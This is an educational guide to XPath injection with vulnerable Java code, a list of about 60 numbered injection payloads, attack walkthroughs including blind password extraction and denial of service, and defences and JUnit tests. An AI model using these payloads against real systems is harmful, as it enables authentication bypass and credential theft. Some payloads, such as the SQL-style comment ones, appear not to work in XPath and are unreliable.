# XPath Injection Vulnerabilities Guide

## Overview

XPath Injection is a security vulnerability that occurs when user-supplied data is incorporated into XPath queries without proper sanitization. Attackers can manipulate these queries to access unauthorized data, bypass authentication, or cause denial of service.

**Severity**: High to Critical  
**OWASP Category**: Injection Flaws  
**CWE ID**: CWE-643

> **Assumption**: This document assumes the application uses XPath to query XML data sources. Applications using SQL databases should refer to SQL injection prevention guides instead.

---

## Table of Contents

1. [How XPath Injection Works](#how-xpath-injection-works)
2. [Vulnerable Code Examples](#vulnerable-code-examples)
3. [50+ Attack Payloads](#50-attack-payloads)
4. [Attack Scenarios](#attack-scenarios)
5. [Defense Mechanisms](#defense-mechanisms)
6. [Testing for Vulnerabilities](#testing-for-vulnerabilities)

---

## How XPath Injection Works

### Basic Concept

XPath is a query language for selecting nodes from XML documents. When user input is directly concatenated into XPath queries, attackers can inject malicious XPath syntax to alter the query logic.

**Analogy**: Similar to SQL injection, but for XML databases.

> **Assumption**: Developers are familiar with basic XPath syntax. If not, review XPath fundamentals before studying injection techniques.

### Example XML Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user id="1">
        <username>admin</username>
        <password>secret123</password>
        <role>administrator</role>
        <email>admin@example.com</email>
    </user>
    <user id="2">
        <username>john</username>
        <password>pass456</password>
        <role>user</role>
        <email>john@example.com</email>
    </user>
    <user id="3">
        <username>alice</username>
        <password>alice789</password>
        <role>user</role>
        <email>alice@example.com</email>
    </user>
</users>
```

> **Assumption**: The XML structure contains sensitive information like passwords. In production, passwords should never be stored in plain text, even in XML.

---

## Vulnerable Code Examples

### Example 1: Authentication Bypass (Java)

**Vulnerable Code**:
```java
public boolean authenticateUser(String username, String password) {
    try {
        // VULNERABLE: Direct string concatenation
        String xpathQuery = "//user[username='" + username + 
                          "' and password='" + password + "']";
        
        XPath xpath = XPathFactory.newInstance().newXPath();
        Node userNode = (Node) xpath.evaluate(xpathQuery, xmlDoc, XPathConstants.NODE);
        
        return userNode != null; // User authenticated if node found
    } catch (Exception e) {
        return false;
    }
}
```

**Attack**:
```
Username: admin
Password: ' or '1'='1

Resulting XPath:
//user[username='admin' and password='' or '1'='1']
```

**Result**: Bypasses authentication because `'1'='1'` is always true.

> **Assumption**: This vulnerable pattern is common in legacy applications that use XML for user authentication. Modern applications should use database-backed authentication with proper password hashing.

---

### Example 2: Data Extraction

**Vulnerable Code**:
```java
public List<User> searchUsers(String searchTerm) {
    String xpathQuery = "//user[contains(username, '" + searchTerm + "')]";
    // Execute query and return results
}
```

**Attack**:
```
Search: ') or contains(password, '

Resulting XPath:
//user[contains(username, '') or contains(password, '')]
```

**Result**: Returns all users, potentially exposing password fields.

---

### Example 3: Role-Based Access Control Bypass

**Vulnerable Code**:
```java
public boolean isAdmin(String username) {
    String xpathQuery = "//user[username='" + username + "' and role='administrator']";
    XPath xpath = XPathFactory.newInstance().newXPath();
    Boolean result = (Boolean) xpath.evaluate(xpathQuery, xmlDoc, XPathConstants.BOOLEAN);
    return result;
}
```

**Attack**:
```
Username: normaluser' or '1'='1

Resulting XPath:
//user[username='normaluser' or '1'='1' and role='administrator']
```

**Result**: Returns true for any user, granting admin privileges.

> **Assumption**: The application uses XPath for authorization checks. This is a design flaw; authorization should be handled at the application layer with proper session management.

---

## 50+ Attack Payloads

### Category 1: Authentication Bypass (15 examples)

These payloads attempt to bypass authentication logic:

```
1.  ' or '1'='1
2.  ' or 1=1 or ''='
3.  ' or 'a'='a
4.  admin' or '1'='1
5.  ') or ('1'='1
6.  ' or true() or '
7.  ') or true() or ('
8.  ' or '1'='1' --
9.  ' or '1'='1' #
10. ') or '1'='1' --
11. admin' and '1'='1
12. ' or 'x'='x
13. ') or count(parent::*)>=0 or ('
14. ' or contains(username, '') or '
15. ') or substring(//user[1]/password,1,1)='a
```

> **Assumption**: These payloads work when the XPath query uses single quotes for string delimiters. Applications using double quotes require different payloads.

---

### Category 2: Data Extraction (15 examples)

These payloads extract sensitive information:

```
16. ' or 1=1]|//password%00
17. ') or 1=1]|//user/password%00
18. ' or count(//user)>0 or ''='
19. '] | //password%00
20. ') | //password%00
21. ' or substring(//user[1]/password,1,1)='a
22. ' or substring(//user[1]/password,1,1)='s
23. ' and substring(//user[1]/password,1,1)='s
24. '] | //user[position()=1]/child::node()%00
25. ') | //user[position()=1]/*%00
26. ' or text()='*
27. ') or name()='username
28. ' or count(/child::node())>0 or ''='
29. ') or string-length(//user[1]/password)>5 or ('
30. ' or //user[contains(password, 's')]
```

> **Assumption**: The attacker knows or can guess the XML structure. In blind XPath injection, attackers use boolean-based or time-based techniques to infer the structure.

---

### Category 3: Logical Operator Manipulation (10 examples)

These payloads manipulate query logic:

```
31. ' and '1'='2
32. ' and false() or '1'='1
33. ') and false() or true() or ('
34. ' or not(false()) or ''='
35. ' and (1=1) or '1'='1
36. ') and (1=2) or (1=1) or ('
37. ' or (1 div 0) or ''='
38. ' or boolean(1) or ''='
39. ' and string-length(//user[1]/username)>0 or ''='
40. ') and count(//user)>0 or count(//user)>0 or ('
```

---

### Category 4: Comment Injection (5 examples)

These payloads use XML/XPath comments:

```
41. ' or '1'='1' <!--
42. admin'<!-- comment -->' or '1'='1
43. ') or '1'='1' <!-- injection
44. ' or '1'='1'<!-- bypassed
45. admin' or '1'='1' <!-- comment --> or ''='
```

> **Assumption**: The XPath processor supports XML comments. Not all processors handle comments the same way in XPath queries.

---

### Category 5: Node Manipulation (10 examples)

These payloads manipulate node selection:

```
46. '] | //*%00
47. ') or self::* or ('
48. ' or parent::* or ''='
49. ' or child::node() or ''='
50. ') | //node()%00
51. ' or ancestor::* or ''='
52. ' or descendant::* or ''='
53. ') or following-sibling::* or ('
54. ' or preceding-sibling::* or ''='
55. '] | //user[@id>0]%00
```

---

### Category 6: Advanced Techniques (5 examples)

Advanced exploitation techniques:

```
56. ' or normalize-space()='' or ''='
57. ' or translate(username,'a','b')=username or ''='
58. ') or starts-with(//user[1]/password, 's') or ('
59. ' or ceiling(1.5)=2 or ''='
60. ' or floor(1.5)=1 or ''='
```

> **Assumption**: These advanced techniques require knowledge of XPath functions. Attackers often enumerate available functions through error messages.

---

## Attack Scenarios

### Scenario 1: Login Bypass

**Context**: A login form that uses XPath for authentication.

**XML Data**:
```xml
<users>
    <user>
        <username>admin</username>
        <password>$ecretP@ss</password>
    </user>
</users>
```

**Vulnerable Query**:
```java
String query = "//user[username='" + username + "' and password='" + password + "']";
```

**Attack Steps**:

1. **Reconnaissance**: Test normal login
   ```
   Username: admin
   Password: wrongpass
   Result: Login failed (expected)
   ```

2. **Test for Injection**: Try basic payload
   ```
   Username: admin
   Password: ' or '1'='1
   Result: Login successful (VULNERABLE!)
   ```

3. **Explanation**:
   ```xpath
   Original: //user[username='admin' and password='$ecretP@ss']
   Injected: //user[username='admin' and password='' or '1'='1']
   ```
   
   The condition becomes: `(username='admin' and password='') or '1'='1'`
   
   Since `'1'='1'` is always true, the query returns the user node.

> **Assumption**: The attacker has direct access to the login form. In some cases, attackers might exploit API endpoints or mobile app backends.

---

### Scenario 2: User Enumeration

**Context**: A user search feature that returns matching users.

**Vulnerable Query**:
```java
String query = "//user[starts-with(username, '" + searchTerm + "')]";
```

**Attack Steps**:

1. **Normal Search**:
   ```
   Search: john
   Returns: john@example.com
   ```

2. **Enumerate All Users**:
   ```
   Search: ') or ('1'='1
   
   Resulting query: //user[starts-with(username, '') or ('1'='1')]
   Returns: ALL users in the system
   ```

3. **Extract Passwords** (if accessible):
   ```
   Search: )] | //password%00
   
   Returns: All password nodes
   ```

**Impact**: Complete user database disclosure, including sensitive information.

> **Assumption**: The application returns full user objects including sensitive fields. Applications should only return necessary fields (principle of least privilege).

---

### Scenario 3: Blind XPath Injection

**Context**: Application doesn't return query results but shows different behavior for true/false conditions.

**Vulnerable Query**:
```java
String query = "//user[username='" + username + "']";
boolean exists = (Boolean) xpath.evaluate(query, xmlDoc, XPathConstants.BOOLEAN);
return exists ? "User found" : "User not found";
```

**Attack Steps**:

1. **Confirm Injection Point**:
   ```
   Username: admin' and '1'='1
   Response: "User found" (true condition)
   
   Username: admin' and '1'='2
   Response: "User not found" (false condition)
   ```

2. **Extract Password Character by Character**:
   ```
   Username: admin' and substring(password,1,1)='a
   Response: "User not found"
   
   Username: admin' and substring(password,1,1)='s
   Response: "User found" ✓ First character is 's'
   
   Username: admin' and substring(password,2,1)='e
   Response: "User found" ✓ Second character is 'e'
   ```

3. **Automate Extraction**:
   ```python
   # Pseudo-code for automated extraction
   password = ""
   for position in range(1, 50):
       for char in 'abcdefghijklmnopqrstuvwxyz0123456789!@#$%':
           payload = f"admin' and substring(password,{position},1)='{char}"
           response = test_login(payload)
           if "User found" in response:
               password += char
               break
   ```

**Impact**: Complete password extraction despite no direct data disclosure.

> **Assumption**: The attacker can make many requests without triggering rate limiting or account lockouts. Applications should implement request throttling and brute-force protection.

---

### Scenario 4: Privilege Escalation

**Context**: Application checks user roles via XPath.

**Vulnerable Query**:
```java
String query = "//user[username='" + username + "' and role='admin']";
boolean isAdmin = (Boolean) xpath.evaluate(query, xmlDoc, XPathConstants.BOOLEAN);
```

**Attack Steps**:

1. **Normal User Login**:
   ```
   Username: john
   Role Check Result: false (john is regular user)
   ```

2. **Inject to Bypass Role Check**:
   ```
   Username: john' or '1'='1
   
   Resulting query: //user[username='john' or '1'='1' and role='admin']
   Result: true (bypassed role check)
   ```

3. **Access Admin Functions**:
   - Delete users
   - Modify configurations
   - Access sensitive data

**Impact**: Unauthorized access to administrative functions.

> **Assumption**: The application trusts the XPath result for authorization decisions. Authorization should use server-side session data, not query results that can be manipulated.

---

### Scenario 5: Denial of Service

**Context**: Complex XPath queries can cause performance degradation.

**Attack Payloads**:

```
1. ' or count(//*)>0 or ''='
   (Counts all nodes in document - expensive)

2. ' or string-length(//text())>0 or ''='
   (Processes all text nodes - memory intensive)

3. ' or //user[contains(translate(username,'a','b'), 'admin')] or ''='
   (Complex string operations on all nodes)

4. ') or (//user//* and //user//*) or ('
   (Cartesian product of all user descendants)

5. ' or sum(//user/@id)>0 or ''='
   (Aggregate function on all nodes)
```

**Impact**: CPU exhaustion, memory exhaustion, or application crash.

> **Assumption**: The XPath processor doesn't have query timeout or resource limits configured. Production systems should enforce query timeouts and resource quotas.

---

## Defense Mechanisms

### 1. Input Sanitization (Using SanitizerUtil)

**Implementation**:
```java
public boolean authenticateUser(String username, String password) {
    // Sanitize inputs
    String safeUsername = SanitizerUtil.sanitize(username, SanitizationContext.XPATH);
    String safePassword = SanitizerUtil.sanitize(password, SanitizationContext.XPATH);
    
    // Build query with sanitized inputs
    String query = "//user[username='" + safeUsername + 
                   "' and password='" + safePassword + "']";
    
    // Execute query
    return executeXPathQuery(query);
}
```

**How It Works**:
- Escapes single quotes: `'` → `&apos;`
- Escapes double quotes: `"` → `&quot;`
- Escapes special chars: `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`

**Result**:
```
Input: ' or '1'='1
Sanitized: &apos; or &apos;1&apos;=&apos;1
Query: //user[username='admin' and password='&apos; or &apos;1&apos;=&apos;1']
```

The injected payload is now treated as literal text, not XPath syntax.

> **Assumption**: OWASP Encoder properly escapes all XPath special characters. This is true for standard XPath 1.0 and 2.0, but custom XPath extensions may require additional escaping.

---

### 2. Parameterized XPath Queries

**Not Directly Supported**: Unlike SQL prepared statements, XPath doesn't have native parameter binding in Java.

**Workaround Using Variables** (XPath 2.0+):

```java
// Some XPath processors support variable binding
XPathExpression expr = xpath.compile("//user[username=$uname and password=$pass]");

// Set variables (if supported by processor)
xpath.setXPathVariableResolver(variableName -> {
    if ("uname".equals(variableName)) return username;
    if ("pass".equals(variableName)) return password;
    return null;
});

Node result = (Node) expr.evaluate(xmlDoc, XPathConstants.NODE);
```

> **Assumption**: This approach requires an XPath processor that supports XPath 2.0 variables. Many Java libraries only support XPath 1.0, which lacks this feature.

---

### 3. Whitelist Validation

**Implementation**:
```java
public boolean authenticateUser(String username, String password) {
    // Validate format before using
    if (!username.matches("^[a-zA-Z0-9_]{3,20}$")) {
        throw new IllegalArgumentException("Invalid username format");
    }
    
    if (!password.matches("^[a-zA-Z0-9!@#$%^&*]{8,50}$")) {
        throw new IllegalArgumentException("Invalid password format");
    }
    
    // Now safe to use in query
    String query = "//user[username='" + username + 
                   "' and password='" + password + "']";
    return executeXPathQuery(query);
}
```

**Advantages**:
- Rejects malicious input before processing
- Clear validation rules
- Performance-efficient

**Disadvantages**:
- May reject legitimate international characters
- Requires maintenance as requirements change

> **Assumption**: The whitelist patterns match all legitimate use cases. Overly restrictive patterns can cause usability issues (e.g., rejecting usernames with hyphens).

---

### 4. Avoid XPath for Authentication

**Best Practice**: Don't use XPath (or XML) for authentication.

**Recommended Approach**:
```java
@Service
public class AuthenticationService {
    
    @Autowired
    private UserRepository userRepository; // Database-backed
    
    @Autowired
    private PasswordEncoder passwordEncoder; // BCrypt, etc.
    
    public boolean authenticateUser(String username, String password) {
        Optional<User> user = userRepository.findByUsername(username);
        
        if (user.isEmpty()) {
            return false;
        }
        
        return passwordEncoder.matches(password, user.get().getPasswordHash());
    }
}
```

**Why This Is Better**:
- Database prepared statements prevent SQL injection
- Passwords are hashed (never stored plain text)
- Established security patterns
- Better performance at scale

> **Assumption**: The application can migrate from XML storage to a proper database. For legacy systems tied to XML, implementing proper sanitization is the next best option.

---

### 5. Principle of Least Privilege

**Implementation**:
```java
// BAD: Returns entire user object
public User getUserByUsername(String username) {
    String query = "//user[username='" + sanitize(username) + "']";
    Node userNode = (Node) xpath.evaluate(query, xmlDoc, XPathConstants.NODE);
    return parseUser(userNode); // Includes password, role, etc.
}

// GOOD: Returns only necessary data
public String getUserEmail(String username) {
    String query = "//user[username='" + sanitize(username) + "']/email";
    String email = (String) xpath.evaluate(query, xmlDoc, XPathConstants.STRING);
    return email; // Only returns email, nothing sensitive
}
```

**Benefits**:
- Limits data exposure if injection occurs
- Reduces attack surface
- Improves performance (less data processing)

---

### 6. Error Handling

**Bad Practice**:
```java
try {
    return executeXPathQuery(query);
} catch (Exception e) {
    // BAD: Exposes query details
    throw new RuntimeException("XPath error: " + e.getMessage() + 
                             " in query: " + query);
}
```

**Good Practice**:
```java
try {
    return executeXPathQuery(query);
} catch (Exception e) {
    // GOOD: Generic message to user, detailed logging
    logger.error("XPath query failed for user: {}", username, e);
    throw new RuntimeException("Authentication failed. Please try again.");
}
```

> **Assumption**: Detailed error messages can leak XML structure information to attackers. Error messages should be generic to users but detailed in server logs for debugging.

---

## Testing for Vulnerabilities

### Manual Testing Checklist

1. **Test Basic Injection**:
   ```
   Input: ' or '1'='1
   Expected: Rejected or sanitized
   ```

2. **Test Boolean Logic**:
   ```
   Input: ' and '1'='1
   Input: ' and '1'='2
   Expected: Different results indicate vulnerability
   ```

3. **Test Comment Injection**:
   ```
   Input: ' or '1'='1' <!--
   Expected: Rejected or sanitized
   ```

4. **Test Node Selection**:
   ```
   Input: '] | //password%00
   Expected: Rejected or sanitized
   ```

5. **Test Blind Injection**:
   ```
   Input: ' and substring(password,1,1)='a
   Expected: No timing or response differences
   ```

---

### Automated Testing Tools

**1. OWASP ZAP (Zed Attack Proxy)**
- Free, open-source security scanner
- Includes XPath injection tests
- Can fuzz input parameters

**2. Burp Suite**
- Professional security testing tool
- XPath injection detection
- Intruder module for custom payloads

**3. SQLMap**
- Primarily for SQL injection
- Can detect some XPath vulnerabilities
- Automated exploitation

> **Assumption**: Security testing should be performed in a non-production environment. Testing in production can cause data corruption or service disruption.

---

### Sample Test Cases (JUnit)

```java
@Test
@DisplayName("Should prevent authentication bypass via XPath injection")
void shouldPreventAuthenticationBypass() {
    String[] maliciousInputs = {
        "' or '1'='1",
        "admin' or '1'='1",
        "') or ('1'='1",
        "' or true() or '"
    };
    
    for (String input : maliciousInputs) {
        boolean result = authService.authenticateUser(input, "anypass");
        assertFalse(result, "Should reject injection payload: " + input);
    }
}

@Test
@DisplayName("Should sanitize XPath special characters")
void shouldSanitizeXPathCharacters() {
    String dangerous = "' or '1'='1";
    String safe = SanitizerUtil.sanitize(dangerous, XPATH);
    
    // Verify quotes are escaped
    assertFalse(safe.contains("'"));
    assertTrue(safe.contains("&apos;"));
}

@Test
@DisplayName("Should prevent data extraction via injection")
void shouldPreventDataExtraction() {
    String payload = "') or 1=1]|//password%00";
    
    List<User> results = userService.searchUsers(payload);
    
    // Should not return all users or password fields
    assertTrue(results.isEmpty() || results.size() == 0,
        "Should not extract data via injection");
}
```

---

## Security Best Practices Summary

1. ✅ **Always sanitize user input** using `SanitizerUtil.sanitize(input, XPATH)`
2. ✅ **Validate input format** using whitelist patterns
3. ✅ **Use databases instead of XML** for authentication and sensitive data
4. ✅ **Implement proper error handling** that doesn't leak system information
5. ✅ **Apply principle of least privilege** - return only necessary data
6. ✅ **Log security events** for monitoring and incident response
7. ✅ **Regular security testing** using automated tools and manual review
8. ✅ **Keep dependencies updated** (OWASP Encoder, Jsoup, etc.)
9. ✅ **Implement rate limiting** to prevent automated attacks
10. ✅ **Security training** for all developers on injection vulnerabilities

> **Assumption**: Security is a continuous process, not a one-time implementation. Regular reviews, updates, and training are essential to maintain a secure application.

---

## Additional Resources

- **OWASP XPath Injection Guide**: https://owasp.org/www-community/attacks/XPATH_Injection
- **CWE-643**: Improper Neutralization of Data within XPath Expressions
- **OWASP Top 10**: A03:2021 – Injection
- **XPath Specification**: https://www.w3.org/TR/xpath/

---

## Conclusion

XPath injection is a serious vulnerability that can lead to authentication bypass, data theft, and system compromise. By understanding attack vectors and implementing proper defenses (sanitization, validation, and architectural best practices), applications can effectively protect against these threats.

The `SanitizerUtil` class provides a robust first line of defense, but should be part of a comprehensive security strategy that includes input validation, proper error handling, security testing, and ongoing monitoring.

> **Final Assumption**: This guide serves as educational material for development teams. Organizations should conduct their own security assessments and adapt these recommendations to their specific requirements and threat model.